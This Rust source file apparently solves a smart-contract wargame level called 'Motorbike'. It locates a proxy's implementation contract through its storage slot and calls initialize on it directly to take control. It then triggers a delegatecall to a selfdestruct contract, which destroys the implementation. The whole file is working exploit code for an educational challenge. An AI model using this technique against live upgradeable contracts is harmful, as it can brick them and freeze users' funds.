use crate::types::*;
use crate::utils;
use ethers::prelude::*;
use ethers::utils::{compile, Solc};
use hex::ToHex;
use std::error::Error;
use std::str::FromStr;
use std::sync::Arc;

abigen!(
    EngineContract,
    r#"[
        function initialize() external
        function upgradeToAndCall(address, bytes memory) external payable
    ]"#,
);

pub async fn solve(level: &Level, config: &EnvironmentConfig) -> Result<(), Box<dyn Error>> {
    let client = Arc::new(utils::create_signer_middleware(
        config.wallet_mnemonic_path.clone(),
        config.network.chain_id,
        config.network.rpc.clone(),
    )?);

    // Deploy a contract with selfdestruct functionality
    let compiled = compile(Solc::new("./contracts/25_motorbike/solution.sol")).await?;
    let solution_contract = compiled
        .get("Solution")
        .expect("could not find solution contract");

    let sd_signature: Bytes = solution_contract
        .abi
        .function("sd")?
        .short_signature()
        .to_vec()
        .into();

    let factory = ContractFactory::new(
        solution_contract.abi.clone(),
        solution_contract.bytecode.clone(),
        client.clone(),
    );
    println!("Deploying solution contract");
    let solution_contract = factory.deploy(())?.legacy().send().await?;
    let solution_address = solution_contract.address();
    println!("Solution contract deployed at {}", solution_address);

    // Get the address of the implementation
    let level_address = level.instance.parse::<Address>()?;
    let implementation_slot =
        H256::from_str("0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc")?;
    let implementation_address: Address = client
        .get_storage_at(level_address, implementation_slot, None)
        .await?
        .into();
    println!(
        "implementation_address: {}",
        implementation_address.encode_hex::<String>()
    );
    let engine_contract = EngineContract::new(implementation_address, client.clone());

    // Although the proxy contract had called `initialize` already, the implementation contract is
    // actually uninitialized itself. Because when it was called by the proxy contract, it's
    // through a delegatecall, which only modified storage of the proxy contract. So when we call
    // `initialize` directly now, we can get pass the `initializer` modifier check.
    let receipt = engine_contract.initialize().legacy().send().await?.await?;
    println!("initialize:\n{}\n", serde_json::to_string_pretty(&receipt)?);

    // Make Engine delegatecall to our contract to selfdestruct
    let receipt = engine_contract
        .upgrade_to_and_call(solution_address, sd_signature.to_vec())
        .legacy()
        .send()
        .await?
        .await?;
    println!(
        "upgradeToAndCall:\n{}\n",
        serde_json::to_string_pretty(&receipt)?
    );

    Ok(())
}
